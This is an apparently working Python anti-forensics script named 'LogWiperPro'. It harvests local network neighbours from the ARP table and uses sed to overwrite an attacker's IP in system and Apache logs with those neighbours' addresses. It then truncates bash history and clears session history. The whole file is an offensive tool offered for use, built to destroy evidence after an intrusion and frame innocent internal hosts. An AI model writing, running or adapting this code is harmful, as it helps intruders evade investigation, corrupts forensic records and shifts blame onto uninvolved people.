#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import subprocess
import random
import re

class LogWiperPro:
    """
    Agent 212 Pro: Adversarial IP Rotation & Masking.
    Identifies active local network neighbors and swaps the attacker's 
    IP with randomized legitimate internal IPs to break forensic breadcrumbs.
    """
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip
        self.log_files = [
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/syslog",
            "/var/log/apache2/access.log"
        ]

    def _get_local_neighbors(self):
        """Discovers active local IPs to use as decoys."""
        print("[*] Harvesting local network neighbors for decoy rotation...")
        try:
            # Parse ARP table for active local IPs
            arp_output = subprocess.check_output(["arp", "-a"]).decode()
            # Regex to find IPs like 192.168.x.x or 10.x.x.x
            ips = re.findall(r"\((.*?)\)", arp_output)
            
            # Filter out broadcast and the attacker's own IP
            decoys = [ip for ip in ips if ip != self.attacker_ip and not ip.endswith(".255")]
            
            if not decoys:
                # Fallback to common gateway/DNS if no neighbors found
                return ["127.0.0.1", "8.8.8.8", "1.1.1.1"]
            return decoys
        except Exception:
            return ["127.0.0.1"]

    def _mask_logs(self):
        """Swaps attacker IP with a randomly chosen decoy for every occurrence."""
        neighbors = self._get_local_neighbors()
        print(f"[*] Found {len(neighbors)} potential decoys. Starting rotation...")

        for log in self.log_files:
            if os.path.exists(log):
                try:
                    # Choose a unique decoy for this specific log file to add randomness
                    decoy = random.choice(neighbors)
                    print(f"    [>] Masking {log} -> Replacing {self.attacker_ip} with {decoy}")
                    
                    # Use sed to replace all occurrences of Attacker IP with Decoy IP
                    subprocess.run(["sed", "-i", f"s/{self.attacker_ip}/{decoy}/g", log], check=True)
                except Exception as e:
                    print(f"    [!] Failed to mask {log}: {e}")

    def _wipe_history(self):
        """Clears bash history and current session memory."""
        print("[*] Scrubbing shell artifacts...")
        hist_file = os.path.expanduser("~/.bash_history")
        if os.path.exists(hist_file):
            with open(hist_file, 'w') as f:
                f.truncate(0)
        # Wipe the current session's memory-resident history
        os.system("history -c")

    def execute(self):
        print(f"--- [AGENT 212: ADVERSARIAL LOG MASKING - {self.attacker_ip}] ---")
        
        if os.getuid() != 0:
            print("[!] Warning: Root required for most log files. Masking may be partial.")

        self._mask_logs()
        self._wipe_history()
        print("[!!!] COUNTER-FORENSIC OPERATION COMPLETE. IP BREADCRUMBS SCATTERED.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo ./main.py <your_attacker_ip>")
        sys.exit(1)
        
    LogWiperPro(sys.argv[1]).execute()
